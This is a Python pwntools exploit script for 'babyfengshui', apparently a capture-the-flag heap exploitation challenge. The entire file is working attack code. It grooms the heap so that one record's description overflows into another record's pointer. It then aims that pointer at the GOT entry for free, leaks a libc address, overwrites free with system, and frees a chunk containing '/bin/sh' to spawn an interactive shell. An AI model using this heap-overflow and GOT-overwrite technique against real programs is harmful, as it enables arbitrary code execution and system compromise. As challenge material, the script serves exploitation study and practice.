#!/usr/bin/env python3

from pwn import *


context.binary = elf = ELF('./babyfengshui_patched')

libc = elf.libc

gs = '''
    handle SIGALRM ignore
    continue
'''


def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return elf.process()

io = start()

index = 0

def add(name, desc_len, desc):
    global index
    io.sendlineafter(b'Action:', b'0')
    io.sendlineafter(b'size of description: ', f'{desc_len}'.encode())
    io.sendlineafter(b'name: ', name)
    io.sendlineafter(b'text length: ', f'{desc_len-1}'.encode())
    io.sendlineafter(b'text: ', desc)

    index += 1
    return index-1
    
def delete(index):
    io.sendlineafter(b'Action: ', b'1')
    io.sendlineafter(b'index: ', f'{index}'.encode())

def update(index, desc_len, desc):
    io.sendlineafter(b'Action: ', b'3')
    io.sendlineafter(b'index: ', f'{index}'.encode())
    io.sendlineafter(b'text length: ', f'{desc_len}'.encode())
    io.sendlineafter(b'text: ', desc)

def display(index):
    io.sendlineafter(b'Action: ', b'2')
    io.sendlineafter(b'index: ', f'{index}'.encode())
    io.recvuntil(b'description: ')



user_A = add(b'AAAAA', 0x88, b'BBBBBBBBB')
user_B = add(b'CCCCC', 0x88, b'DDDDDDDDD') # we will overflow into this one

delete(user_A)

user_C = add(b'AAAAA', 0x18, b'user_C')

user_D = add(b'ZZZZZ', 0x68, b'overflow ??')

offset_to_name = 0x100

update(user_D, offset_to_name+0x4, b'/bin/sh\x00' + b'A'* (offset_to_name-0x8) + p32(elf.got.free))

display(user_B)

libc.address = u32(io.recv(4)) - 0x72dc0
log.success(f'libc @ 0x{libc.address:02x}')

update(user_B, 0x4, p32(libc.sym.system))


delete(user_D)
io.interactive()
